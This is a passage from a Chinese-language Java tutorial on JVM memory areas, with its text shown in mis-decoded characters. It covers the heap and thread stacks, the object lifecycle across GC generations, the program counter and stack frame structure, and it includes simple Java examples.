    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// çº¿ç¨‹1ï¼šè®¿é—®resource1</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-comment">// obj1å¼•ç”¨å­˜å‚¨åœ¨æ ˆ1ä¸­ï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
            <span class="hljs-type">SharedResource</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> resource1;  <span class="hljs-comment">// å¼•ç”¨æŒ‡å‘å †ä¸­çš„resource1</span>
            
            <span class="hljs-comment">// é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
            <span class="hljs-keyword">synchronized</span> (obj1) {
                obj1.doWork();
            }
        });
        
        <span class="hljs-comment">// çº¿ç¨‹2ï¼šè®¿é—®resource2</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-comment">// obj2å¼•ç”¨å­˜å‚¨åœ¨æ ˆ2ä¸­ï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
            <span class="hljs-type">SharedResource</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> resource2;  <span class="hljs-comment">// å¼•ç”¨æŒ‡å‘å †ä¸­çš„resource2</span>
            
            <span class="hljs-comment">// é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
            <span class="hljs-keyword">synchronized</span> (obj2) {
                obj2.doWork();
            }
        });
        
        <span class="hljs-comment">// çº¿ç¨‹3ï¼šåŒæ—¶è®¿é—®resource1å’Œresource2</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-comment">// obj1å’Œobj2å¼•ç”¨å­˜å‚¨åœ¨æ ˆ3ä¸­ï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
            <span class="hljs-type">SharedResource</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> resource1;  <span class="hljs-comment">// å¼•ç”¨æŒ‡å‘å †ä¸­çš„resource1</span>
            <span class="hljs-type">SharedResource</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> resource2;  <span class="hljs-comment">// å¼•ç”¨æŒ‡å‘å †ä¸­çš„resource2</span>
            
            <span class="hljs-comment">// é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
            <span class="hljs-keyword">synchronized</span> (obj1) {
                obj1.doWork();
            }
            <span class="hljs-keyword">synchronized</span> (obj2) {
                obj2.doWork();
            }
        });
        
        thread1.start();
        thread2.start();
        thread3.start();
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SharedResource</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å·¥ä½œä»£ç </span>
    }
}
</code></pre>
<p><strong>å…³é”®ç‚¹æ€»ç»“ï¼š</strong></p>
<ol>
<li><strong>ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰å­˜å‚¨å¼•ç”¨</strong>ï¼šå¯¹è±¡å¼•ç”¨å­˜å‚¨åœ¨æ ˆä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„æ ˆ</li>
<li><strong>å…±äº«åŒºåŸŸï¼ˆå †ï¼‰å­˜å‚¨å¯¹è±¡</strong>ï¼šå¯¹è±¡æœ¬èº«å­˜å‚¨åœ¨å †ä¸­ï¼Œæ‰€æœ‰çº¿ç¨‹å¯ä»¥å…±äº«</li>
<li><strong>é€šè¿‡å¼•ç”¨è®¿é—®å¯¹è±¡</strong>ï¼šçº¿ç¨‹é€šè¿‡æ ˆä¸­çš„å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</li>
<li><strong>éœ€è¦åŒæ­¥æœºåˆ¶</strong>ï¼šå¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªå…±äº«å¯¹è±¡æ—¶ï¼Œéœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</li>
</ol>
<h4 data-id="heading-18">2.4 å†…å­˜åŒºåŸŸå¤§å°å…³ç³»å›¾</h4>
<pre><code class="hljs language-scss" lang="scss">å†…å­˜å¤§å°å…³ç³»ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Javaå †(æœ€å¤§)â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   æ–¹æ³•åŒº    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  è™šæ‹Ÿæœºæ ˆ   â”‚ (æ¯ä¸ªçº¿ç¨‹)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ç¨‹åºè®¡æ•°å™¨  â”‚ (å¾ˆå°)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  ç›´æ¥å†…å­˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å¤§å°å…³ç³»è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>Javaå †</strong>ï¼šæœ€å¤§ï¼Œé€šå¸¸å JVMå†…å­˜çš„å¤§éƒ¨åˆ†ï¼ˆå¦‚-Xmxè®¾ç½®çš„å †å¤§å°ï¼‰</li>
<li><strong>æ–¹æ³•åŒº</strong>ï¼šä¸­ç­‰ï¼Œå­˜å‚¨ç±»ä¿¡æ¯ã€å¸¸é‡ç­‰ï¼ˆé€šå¸¸å‡ åMBåˆ°å‡ ç™¾MBï¼‰</li>
<li><strong>è™šæ‹Ÿæœºæ ˆ</strong>ï¼šè¾ƒå°ï¼Œæ¯ä¸ªçº¿ç¨‹çº¦1MBï¼ˆçº¿ç¨‹æ•° Ã— 1MBï¼‰</li>
<li><strong>ç¨‹åºè®¡æ•°å™¨</strong>ï¼šå¾ˆå°ï¼Œå¯ä»¥å¿½ç•¥</li>
<li><strong>ç›´æ¥å†…å­˜</strong>ï¼šå¤§å°å–å†³äºä½¿ç”¨æƒ…å†µ</li>
</ol>
<h4 data-id="heading-19">2.5 å¯¹è±¡åœ¨å†…å­˜ä¸­çš„æµè½¬å›¾</h4>
<pre><code class="hljs language-markdown" lang="markdown">å¯¹è±¡ç”Ÿå‘½å‘¨æœŸï¼š

åˆ›å»º â†’ EdenåŒº â†’ Minor GC â†’ SurvivoråŒº â†’ å¹´é¾„å¢é•¿ â†’ è€å¹´ä»£ â†’ Full GC â†’ å›æ”¶

è¯¦ç»†æµç¨‹ï¼š
<span class="hljs-bullet">1.</span> åˆ›å»ºå¯¹è±¡ â†’ EdenåŒº
<span class="hljs-bullet">2.</span> EdenåŒºæ»¡ â†’ Minor GC â†’ å­˜æ´»å¯¹è±¡ â†’ SurvivoråŒº
<span class="hljs-bullet">3.</span> å¤šæ¬¡GCå â†’ å¹´é¾„è¾¾åˆ°é˜ˆå€¼ â†’ è€å¹´ä»£
<span class="hljs-bullet">4.</span> è€å¹´ä»£æ»¡ â†’ Full GC â†’ å¯¹è±¡å›æ”¶
</code></pre>
<p><strong>æµè½¬è¿‡ç¨‹è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>å¯¹è±¡åˆ›å»º</strong>ï¼šæ–°å¯¹è±¡é¦–å…ˆåˆ†é…åœ¨EdenåŒº</li>
<li><strong>Minor GC</strong>ï¼šå½“EdenåŒºæ»¡æ—¶ï¼Œè§¦å‘Minor GCï¼Œå­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°SurvivoråŒº</li>
<li><strong>SurvivoråŒºå¤åˆ¶</strong>ï¼šå¯¹è±¡åœ¨SurvivoråŒºçš„Fromå’ŒToä¹‹é—´æ¥å›å¤åˆ¶ï¼Œæ¯ç»å†ä¸€æ¬¡GCï¼Œå¹´é¾„+1</li>
<li><strong>æ™‹å‡è€å¹´ä»£</strong>ï¼šå¯¹è±¡å¹´é¾„è¾¾åˆ°é˜ˆå€¼ï¼ˆé»˜è®¤15ï¼‰åï¼Œæ™‹å‡åˆ°è€å¹´ä»£</li>
<li><strong>Full GC</strong>ï¼šè€å¹´ä»£æ»¡æ—¶ï¼Œè§¦å‘Full GCï¼Œå›æ”¶ä¸å†ä½¿ç”¨çš„å¯¹è±¡</li>
</ol>
<p><strong>å®é™…ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectLifecycle</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createObjects</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. åˆ›å»ºå¯¹è±¡ â†’ åˆ†é…åœ¨EdenåŒº</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// æ–°å¯¹è±¡åœ¨EdenåŒº</span>
        
        <span class="hljs-comment">// 2. å¦‚æœEdenåŒºæ»¡äº†ï¼Œè§¦å‘Minor GC</span>
        <span class="hljs-comment">// å­˜æ´»çš„å¯¹è±¡ä¼šè¢«å¤åˆ¶åˆ°SurvivoråŒº</span>
        
        <span class="hljs-comment">// 3. å¯¹è±¡åœ¨SurvivoråŒºä¹‹é—´å¤åˆ¶</span>
        <span class="hljs-comment">// æ¯æ¬¡GCï¼Œå¯¹è±¡å¹´é¾„+1</span>
        
        <span class="hljs-comment">// 4. å¹´é¾„è¾¾åˆ°é˜ˆå€¼ â†’ æ™‹å‡åˆ°è€å¹´ä»£</span>
        <span class="hljs-comment">// é»˜è®¤å¹´é¾„é˜ˆå€¼æ˜¯15</span>
        
        <span class="hljs-comment">// 5. è€å¹´ä»£æ»¡æ—¶ â†’ è§¦å‘Full GC</span>
        <span class="hljs-comment">// å›æ”¶ä¸å†ä½¿ç”¨çš„å¯¹è±¡</span>
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-20">ç¬¬ä¸‰éƒ¨åˆ†ï¼šå„å†…å­˜åŒºåŸŸè¯¦è§£</h2>
<h3 data-id="heading-21">3. ç¨‹åºè®¡æ•°å™¨ï¼ˆProgram Counter Registerï¼‰</h3>
<h4 data-id="heading-22">3.1 ä½œç”¨</h4>
<p>ç¨‹åºè®¡æ•°å™¨æ˜¯ä¸€å—å¾ˆå°çš„å†…å­˜ç©ºé—´ï¼Œå®ƒå¯ä»¥çœ‹ä½œæ˜¯å½“å‰çº¿ç¨‹æ‰€æ‰§è¡Œçš„å­—èŠ‚ç çš„è¡Œå·æŒ‡ç¤ºå™¨ã€‚</p>
<p><strong>å…·ä½“ä½œç”¨ï¼š</strong></p>
<ul>
<li>è®°å½•å½“å‰çº¿ç¨‹æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤åœ°å€</li>
<li>çº¿ç¨‹ç§æœ‰ï¼Œæ¯ä¸ªçº¿ç¨‹ç‹¬ç«‹</li>
<li>åˆ†æ”¯ã€å¾ªç¯ã€è·³è½¬ã€å¼‚å¸¸å¤„ç†ã€çº¿ç¨‹æ¢å¤ç­‰éƒ½éœ€è¦ä¾èµ–ç¨‹åºè®¡æ•°å™¨æ¥å®Œæˆ</li>
</ul>
<p><strong>å·¥ä½œç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">// ç¨‹åºè®¡æ•°å™¨æŒ‡å‘è¿™æ¡æŒ‡ä»¤</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;      <span class="hljs-comment">// ç¨‹åºè®¡æ•°å™¨ç§»åŠ¨åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;  <span class="hljs-comment">// ç¨‹åºè®¡æ•°å™¨ç»§ç»­ç§»åŠ¨</span>
}
</code></pre>
<h4 data-id="heading-23">3.2 ç‰¹ç‚¹</h4>
<ol>
<li>
<p><strong>å”¯ä¸€ä¸ä¼šå‘ç”ŸOutOfMemoryErrorçš„åŒºåŸŸ</strong></p>
<ul>
<li>ç¨‹åºè®¡æ•°å™¨å ç”¨çš„å†…å­˜å¾ˆå°ï¼Œå‡ ä¹å¯ä»¥å¿½ç•¥</li>
<li>ä¸ä¼šå› ä¸ºç¨‹åºè®¡æ•°å™¨çš„åŸå› å¯¼è‡´å†…å­˜æº¢å‡º</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹ç§æœ‰</strong></p>
<ul>
<li>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ç¨‹åºè®¡æ•°å™¨</li>
<li>çº¿ç¨‹ä¹‹é—´äº’ä¸å½±å“</li>
</ul>
</li>
<li>
<p><strong>æ‰§è¡ŒNativeæ–¹æ³•æ—¶å€¼ä¸ºç©º</strong></p>
<ul>
<li>å½“çº¿ç¨‹æ‰§è¡ŒJavaæ–¹æ³•æ—¶ï¼Œç¨‹åºè®¡æ•°å™¨è®°å½•çš„æ˜¯æ­£åœ¨æ‰§è¡Œçš„è™šæ‹Ÿæœºå­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€</li>
<li>å½“çº¿ç¨‹æ‰§è¡ŒNativeæ–¹æ³•ï¼ˆæœ¬åœ°æ–¹æ³•ï¼‰æ—¶ï¼Œç¨‹åºè®¡æ•°å™¨çš„å€¼ä¸ºç©ºï¼ˆundefinedï¼‰</li>
</ul>
</li>
</ol>
<p><strong>ç¤ºæ„å›¾ï¼š</strong></p>
<pre><code class="hljs">çº¿ç¨‹1ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç¨‹åºè®¡æ•°å™¨   â”‚
â”‚ åœ°å€ï¼š0x100  â”‚ â† æŒ‡å‘å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

çº¿ç¨‹2ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç¨‹åºè®¡æ•°å™¨   â”‚
â”‚ åœ°å€ï¼š0x200  â”‚ â† æŒ‡å‘å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆç‹¬ç«‹ï¼‰
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

çº¿ç¨‹3ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç¨‹åºè®¡æ•°å™¨   â”‚
â”‚ åœ°å€ï¼š0x300  â”‚ â† æŒ‡å‘å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆç‹¬ç«‹ï¼‰
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-24">3.3 å®é™…åº”ç”¨</h4>
<p><strong>1. çº¿ç¨‹åˆ‡æ¢æ—¶ä¿å­˜å’Œæ¢å¤æ‰§è¡Œä½ç½®</strong></p>
<p>å½“CPUä»ä¸€ä¸ªçº¿ç¨‹åˆ‡æ¢åˆ°å¦ä¸€ä¸ªçº¿ç¨‹æ—¶ï¼Œéœ€è¦ï¼š</p>
<ul>
<li>ä¿å­˜å½“å‰çº¿ç¨‹çš„ç¨‹åºè®¡æ•°å™¨å€¼</li>
<li>æ¢å¤ä¸‹ä¸€ä¸ªçº¿ç¨‹çš„ç¨‹åºè®¡æ•°å™¨å€¼</li>
<li>è¿™æ ·çº¿ç¨‹æ¢å¤æ—¶æ‰èƒ½ä»ä¸Šæ¬¡æ‰§è¡Œçš„ä½ç½®ç»§ç»­æ‰§è¡Œ</li>
</ul>
<p><strong>2. åˆ†æ”¯ã€å¾ªç¯ã€å¼‚å¸¸å¤„ç†ç­‰æ§åˆ¶æµçš„åŸºç¡€</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">5</span>) {        <span class="hljs-comment">// ç¨‹åºè®¡æ•°å™¨è®°å½•ifåˆ¤æ–­çš„æŒ‡ä»¤åœ°å€</span>
        x = <span class="hljs-number">20</span>;         <span class="hljs-comment">// å¦‚æœæ¡ä»¶ä¸ºçœŸï¼Œè·³è½¬åˆ°è¿™é‡Œ</span>
    } <span class="hljs-keyword">else</span> {
        x = <span class="hljs-number">0</span>;          <span class="hljs-comment">// å¦‚æœæ¡ä»¶ä¸ºå‡ï¼Œè·³è½¬åˆ°è¿™é‡Œ</span>
    }
    
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {  <span class="hljs-comment">// ç¨‹åºè®¡æ•°å™¨è®°å½•å¾ªç¯çš„æŒ‡ä»¤åœ°å€</span>
        <span class="hljs-comment">// å¾ªç¯ä½“</span>
    }
}
</code></pre>
<h3 data-id="heading-25">4. Javaè™šæ‹Ÿæœºæ ˆï¼ˆJava Virtual Machine Stackï¼‰</h3>
<h4 data-id="heading-26">4.1 ä½œç”¨</h4>
<p>Javaè™šæ‹Ÿæœºæ ˆæ˜¯çº¿ç¨‹ç§æœ‰çš„ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸä¸çº¿ç¨‹ç›¸åŒã€‚è™šæ‹Ÿæœºæ ˆæè¿°çš„æ˜¯Javaæ–¹æ³•æ‰§è¡Œçš„å†…å­˜æ¨¡å‹ã€‚</p>
<p><strong>ä¸»è¦ä½œç”¨ï¼š</strong></p>
<ul>
<li>å­˜å‚¨å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°ã€è¿”å›å€¼ã€ä¸­é—´ç»“æœç­‰</li>
<li>æ¯ä¸ªæ–¹æ³•åœ¨æ‰§è¡Œæ—¶éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§ï¼ˆStack Frameï¼‰ç”¨äºå­˜å‚¨å±€éƒ¨å˜é‡è¡¨ã€æ“ä½œæ•°æ ˆã€åŠ¨æ€é“¾æ¥ã€æ–¹æ³•å‡ºå£ç­‰ä¿¡æ¯</li>
<li>æ¯ä¸ªæ–¹æ³•ä»è°ƒç”¨åˆ°æ‰§è¡Œå®Œæˆçš„è¿‡ç¨‹ï¼Œå°±å¯¹åº”ç€ä¸€ä¸ªæ ˆå¸§åœ¨è™šæ‹Ÿæœºæ ˆä¸­ä»å…¥æ ˆåˆ°å‡ºæ ˆçš„è¿‡ç¨‹</li>
</ul>
<p><strong>å®é™…ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodA</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;        <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼Œå­˜å‚¨åœ¨methodAçš„æ ˆå¸§ä¸­</span>
    methodB();        <span class="hljs-comment">// è°ƒç”¨methodBï¼Œåˆ›å»ºmethodBçš„æ ˆå¸§</span>
    <span class="hljs-comment">// methodBæ‰§è¡Œå®Œåï¼ŒmethodBçš„æ ˆå¸§å‡ºæ ˆ</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodB</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;        <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼Œå­˜å‚¨åœ¨methodBçš„æ ˆå¸§ä¸­</span>
    methodC();        <span class="hljs-comment">// è°ƒç”¨methodCï¼Œåˆ›å»ºmethodCçš„æ ˆå¸§</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodC</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;        <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼Œå­˜å‚¨åœ¨methodCçš„æ ˆå¸§ä¸­</span>
}

<span class="hljs-comment">// æ ˆå¸§ç»“æ„ï¼š</span>
<span class="hljs-comment">// â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="hljs-comment">// â”‚ methodCæ ˆå¸§ â”‚ â† æ ˆé¡¶ï¼ˆå½“å‰æ‰§è¡Œçš„æ–¹æ³•ï¼‰</span>
<span class="hljs-comment">// â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="hljs-comment">// â”‚ methodBæ ˆå¸§ â”‚</span>
<span class="hljs-comment">// â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="hljs-comment">// â”‚ methodAæ ˆå¸§ â”‚</span>
<span class="hljs-comment">// â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre>
<h4 data-id="heading-27">4.2 æ ˆå¸§ç»“æ„å›¾</h4>
<pre><code class="hljs">æ ˆå¸§ç»“æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ å±€éƒ¨å˜é‡è¡¨   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ“ä½œæ•°æ ˆ     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ åŠ¨æ€é“¾æ¥     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ–¹æ³•è¿”å›åœ°å€ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-28">4.3 æ ˆå¸§å„éƒ¨åˆ†è¯¦è§£</h4>
<p><strong>1. å±€éƒ¨å˜é‡è¡¨ï¼ˆLocal Variablesï¼‰</strong></p>
<p>å±€éƒ¨å˜é‡è¡¨æ˜¯ä¸€ç»„å˜é‡å€¼å­˜å‚¨ç©ºé—´ï¼Œç”¨äºå­˜æ”¾æ–¹æ³•å‚æ•°å’Œæ–¹æ³•å†…éƒ¨å®šä¹‰çš„å±€éƒ¨å˜é‡ã€‚</p>
<p><strong>å­˜å‚¨å†…å®¹ï¼š</strong></p>
<ul>
<li>æ–¹æ³•å‚æ•°ï¼šä¼ å…¥æ–¹æ³•çš„å‚æ•°</li>
<li>å±€éƒ¨å˜é‡ï¼šæ–¹æ³•å†…éƒ¨å®šä¹‰çš„å˜é‡</li>
<li>å¯¹è±¡å¼•ç”¨ï¼šå¯¹è±¡çš„å¼•ç”¨ï¼ˆå¯¹è±¡æœ¬èº«åœ¨å †ä¸­ï¼‰</li>
</ul>
<p><strong>æ§½ï¼ˆSlotï¼‰çš„æ¦‚å¿µï¼š</strong></p>
<ul>
<li>å±€éƒ¨å˜é‡è¡¨ä»¥å˜é‡æ§½ï¼ˆSlotï¼‰ä¸ºæœ€å°å•ä½</li>
<li>32ä½æ•°æ®ç±»å‹ï¼ˆbooleanã€byteã€charã€shortã€intã€floatã€referenceï¼‰å ç”¨1ä¸ªSlot</li>
<li>64ä½æ•°æ®ç±»å‹ï¼ˆlongã€doubleï¼‰å ç”¨2ä¸ªSlot</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">(<span class="hljs-type">int</span> param1, <span class="hljs-type">long</span> param2)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">local1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;      <span class="hljs-comment">// å ç”¨1ä¸ªSlot</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">local2</span> <span class="hljs-operator">=</span> <span class="hljs-number">20L</span>;    <span class="hljs-comment">// å ç”¨2ä¸ªSlot</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¼•ç”¨å ç”¨1ä¸ªSlotï¼Œå¯¹è±¡åœ¨å †ä¸­</span>
}
</code></pre>
<p><strong>2. æ“ä½œæ•°æ ˆï¼ˆOperand Stackï¼‰</strong></p>
<p>æ“ä½œæ•°æ ˆæ˜¯ä¸€ä¸ªåè¿›å…ˆå‡ºï¼ˆLIFOï¼‰çš„æ ˆï¼Œç”¨äºä¿å­˜è®¡ç®—è¿‡ç¨‹ä¸­çš„ä¸­é—´ç»“æœã€‚</p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>ä¿å­˜è®¡ç®—è¿‡ç¨‹ä¸­çš„ä¸´æ—¶ç»“æœ</li>
<li>ä¸ºå…¶ä»–æŒ‡ä»¤æä¾›æ“ä½œæ•°</li>
<li>å­˜æ”¾æ–¹æ³•è°ƒç”¨çš„å‚æ•°å’Œè¿”å›å€¼</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculate</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;      <span class="hljs-comment">// æ“ä½œæ•°æ ˆï¼špush 10</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;      <span class="hljs-comment">// æ“ä½œæ•°æ ˆï¼špush 20</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;   <span class="hljs-comment">// æ“ä½œæ•°æ ˆï¼špop 20, pop 10, push 30</span>
    <span class="hljs-keyword">return</span> c;        <span class="hljs-comment">// æ“ä½œæ•°æ ˆï¼špop 30ä½œä¸ºè¿”å›å€¼</span>
}
</code></pre>
<p><strong>3. åŠ¨æ€é“¾æ¥ï¼ˆDynamic Linkingï¼‰</strong></p>
<p>åŠ¨æ€é“¾æ¥æŒ‡å‘è¿è¡Œæ—¶å¸¸é‡æ± ä¸­è¯¥æ ˆå¸§æ‰€å±æ–¹æ³•çš„å¼•ç”¨ã€‚</p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>åœ¨æ–¹æ³•è°ƒç”¨æ—¶ï¼Œå°†ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨</li>
<li>æ”¯æŒå¤šæ€ï¼šåœ¨è¿è¡Œæ—¶ç¡®å®šå®é™…è°ƒç”¨çš„æ–¹æ³•</li>
</ul>
<p><strong>4. æ–¹æ³•è¿”å›åœ°å€ï¼ˆReturn Addressï¼‰</strong></p>
<p>æ–¹æ³•è¿”å›åœ°å€å­˜å‚¨æ–¹æ³•é€€å‡ºåè¿”å›åˆ°å“ªæ¡æŒ‡ä»¤ç»§ç»­æ‰§è¡Œã€‚</p>
<p><strong>ä¸¤ç§æƒ…å†µï¼š</strong></p>
<ul>
<li><strong>æ­£å¸¸è¿”å›</strong>ï¼šæ–¹æ³•æ­£å¸¸æ‰§è¡Œå®Œæ¯•ï¼Œè¿”å›åˆ°è°ƒç”¨è€…çš„ä¸‹ä¸€æ¡æŒ‡ä»¤</li>
<li><strong>å¼‚å¸¸è¿”å›</strong>ï¼šæ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œé€šè¿‡å¼‚å¸¸å¤„ç†è¡¨ç¡®å®šè¿”å›åœ°å€</li>
</ul>
<h4 data-id="heading-29">4.4 æ ˆçš„å¼‚å¸¸</h4>
